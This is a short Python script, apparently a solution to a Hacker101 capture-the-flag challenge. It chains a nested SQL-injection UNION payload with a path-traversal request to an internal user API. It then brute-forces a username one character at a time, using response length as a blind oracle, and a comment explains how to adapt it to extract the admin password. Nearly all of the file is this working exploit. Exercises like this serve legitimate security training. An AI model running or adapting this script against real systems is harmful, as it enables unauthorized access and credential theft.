import requests
from bs4 import BeautifulSoup as BSHTML

start=''
alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'

def guess(start):
    for letter in alphabet:
        attempt=start+letter
        url = f'''https://6fc6375ff9975510296dc4e2b4275663.ctf.hacker101.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%22../api/user?username={attempt}%25\%22;/*%22,1,1;/*'''
        # Adjusting the above and replacing ?username={attempt} with ?username=grinchadmin&password={attempt} to get the password
        r = requests.get(url)
        print(r)
        soup = BSHTML(r.text, "html.parser")
        images = soup.findAll('img')
        print(images)
        r = requests.get("https://6fc6375ff9975510296dc4e2b4275663.ctf.hacker101.com" + images[1]["src"])
        if len(r.text) != 39:
            return attempt
    return start

updated=guess(start)
while updated != start:
    start = updated
    updated=guess(start)
    print("nearly there: " + updated)

print("found: " + updated)